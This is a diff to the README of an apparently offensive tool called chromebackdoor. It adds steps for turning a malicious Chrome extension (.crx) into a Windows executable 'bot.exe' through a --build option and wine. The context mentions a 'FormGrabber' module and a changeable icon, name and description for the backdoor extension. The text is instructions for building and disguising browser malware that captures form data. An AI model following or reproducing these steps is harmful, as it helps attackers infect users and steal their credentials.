@@ -62,3 +62,19 @@ Select one module (exemple FormGrabber V1.0)
 ```
 
 The script  generate zip file with .crx .perm and backdoor folder for update icon / name / desc
+
+#BUILD .EXE
+
+1) run chrommebackdoor with --build
+```sh
+python chromebackdoor.py --build
+```
+2) select browser backdoor (exemple --chrome)
+```sh
+[?] crx fime (/root/..) ? /root/backdoor.crx
+```
+3) wine start installer.exe and generate bot.exe
+4) Start bot.exe with windows
+```sh
+Generate successful : {chromebackdoor_folder}/bot.exe
+```
